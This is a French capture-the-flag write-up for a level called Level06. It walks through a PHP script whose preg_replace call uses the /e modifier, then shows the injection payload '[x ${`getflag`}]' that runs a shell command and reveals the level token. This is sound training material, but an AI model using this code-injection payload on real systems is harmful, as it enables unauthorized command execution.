@@ -1,0 +1,38 @@
+Level06 :
+
+on se connecte avec le flag05
+
+on se place dans le home : cd 
+
+on inspecte l'ensemble des dossiers et fichiers et leur droits : ls -la
+
+on peut voir un fichier executable : level06 et un fichier php level06.php
+
+lorsque qu'on le lance : ./level06
+—> PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+
+on en déduit que le programme en php prend un fichier en argument
+
+quand on inspecte le fichier php : cat level06.php
+
+		#!/usr/bin/php
+		<?php
+		function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+		function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+		$r = x($argv[1], $argv[2]); print $r;
+		?>
+
+
+On teste différente regex jusqu'à trouver la bonne : 
+
+On se place dans /tmp pour créer nos fichiers
+
+echo 'getflag' > /tmp/level06
+echo '(getflag)' > /tmp/level06
+echo '[getflag]' > /tmp/level06
+
+echo '[x ${`getflag`}]' > /tmp/level06
+
+./level06 /tmp/level06
+—> PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+fonctionne grace au \e 
